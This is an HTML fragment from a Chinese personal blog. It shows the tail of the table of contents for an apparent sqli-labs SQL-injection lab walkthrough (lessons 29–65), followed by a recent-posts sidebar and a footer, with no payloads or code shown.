href="#less-29-SERVER%E5%92%8C-GET%E4%BA%A4%E5%8F%89%E4%BD%BF%E7%94%A8%EF%BC%8CHTTP-Parameter-Pollution%E4%BB%A5%E5%8F%8A%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">34.</span> <span class="toc-text">less-29($_SERVER和$_GET交叉使用，HTTP Parameter Pollution以及逻辑漏洞)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F%EF%BC%88HTTP-Parameter-Pollution%EF%BC%89"><span class="toc-number">34.1.</span> <span class="toc-text">尝试覆盖变量（HTTP Parameter Pollution）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E9%95%BF%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">34.2.</span> <span class="toc-text">构造一个比较长的字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E4%B8%A4%E4%B8%AA%E5%AD%97%E7%AC%A6-%E2%80%9Cid%E2%80%9D"><span class="toc-number">34.3.</span> <span class="toc-text">前两个字符 &#x3D;&#x3D; “id”</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-30"><span class="toc-number">35.</span> <span class="toc-text">less-30</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-31"><span class="toc-number">36.</span> <span class="toc-text">less-31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-32%EF%BC%88%E5%AE%BD%E5%AD%97%E7%AC%A6-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">37.</span> <span class="toc-text">less-32（宽字符&#x2F;宽字节注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-33"><span class="toc-number">38.</span> <span class="toc-text">less-33</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-34"><span class="toc-number">39.</span> <span class="toc-text">less-34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-35"><span class="toc-number">40.</span> <span class="toc-text">less-35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-36"><span class="toc-number">41.</span> <span class="toc-text">less-36</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-37"><span class="toc-number">42.</span> <span class="toc-text">less-37</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-38"><span class="toc-number">43.</span> <span class="toc-text">less-38</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-39"><span class="toc-number">44.</span> <span class="toc-text">less-39</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-40"><span class="toc-number">45.</span> <span class="toc-text">less-40</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-41"><span class="toc-number">46.</span> <span class="toc-text">less-41</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-42"><span class="toc-number">47.</span> <span class="toc-text">less-42</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-43"><span class="toc-number">48.</span> <span class="toc-text">less-43</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-44"><span class="toc-number">49.</span> <span class="toc-text">less-44</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-45"><span class="toc-number">50.</span> <span class="toc-text">less-45</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-46%EF%BC%88order-by%EF%BC%89"><span class="toc-number">51.</span> <span class="toc-text">less-46（order by）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-47%EF%BC%88order-by%EF%BC%8C%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8C%85%E8%A3%B9%EF%BC%89"><span class="toc-number">52.</span> <span class="toc-text">less-47（order by，单引号包裹）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-48"><span class="toc-number">53.</span> <span class="toc-text">less-48</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-49"><span class="toc-number">54.</span> <span class="toc-text">less-49</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-50"><span class="toc-number">55.</span> <span class="toc-text">less-50</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-51"><span class="toc-number">56.</span> <span class="toc-text">less-51</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-52"><span class="toc-number">57.</span> <span class="toc-text">less-52</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-53"><span class="toc-number">58.</span> <span class="toc-text">less-53</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-54-%EF%BC%88challenge%EF%BC%8C%E5%B8%B8%E8%A7%84sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-number">59.</span> <span class="toc-text">less-54 （challenge，常规sql注入流程）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-55"><span class="toc-number">60.</span> <span class="toc-text">less-55</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-56"><span class="toc-number">61.</span> <span class="toc-text">less-56</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-57"><span class="toc-number">62.</span> <span class="toc-text">less-57</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-58"><span class="toc-number">63.</span> <span class="toc-text">less-58</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-59"><span class="toc-number">64.</span> <span class="toc-text">less-59</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-60"><span class="toc-number">65.</span> <span class="toc-text">less-60</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-61"><span class="toc-number">66.</span> <span class="toc-text">less-61</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-62"><span class="toc-number">67.</span> <span class="toc-text">less-62</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-63"><span class="toc-number">68.</span> <span class="toc-text">less-63</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-64"><span class="toc-number">69.</span> <span class="toc-text">less-64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-65"><span class="toc-number">70.</span> <span class="toc-text">less-65</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F%E4%BA%86"><span class="toc-number">71.</span> <span class="toc-text">结束了</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/25/%E7%BF%BB%E6%96%B0%E5%8D%9A%E5%AE%A2/" title="翻新博客">翻新博客</a><time datetime="2025-02-25T13:11:00.000Z" title="发表于 2025-02-25 21:11:00">2025-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/10/leetcode-856-%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%88%86%E6%95%B0-%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E5%AE%9A%E4%B9%89/" title="leetcode 856. 括号的分数 简单的语法制导定义">leetcode 856. 括号的分数 简单的语法制导定义</a><time datetime="2022-10-09T16:08:02.000Z" title="发表于 2022-10-10 00:08:02">2022-10-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/03/docker%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="docker的简单使用">docker的简单使用</a><time datetime="2022-05-03T13:17:11.000Z" title="发表于 2022-05-03 21:17:11">2022-05-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/01/linux%E5%8F%8D%E5%90%91shell/" title="linux反向shell">linux反向shell</a><time datetime="2022-05-01T06:19:17.000Z" title="发表于 2022-05-01 14:19:17">2022-05-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/28/git%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="git的简单使用">git的简单使用</a><time datetime="2022-04-28T15:17:34.000Z" title="发表于 2022-04-28 23:17:34">2022-04-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By x4297</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
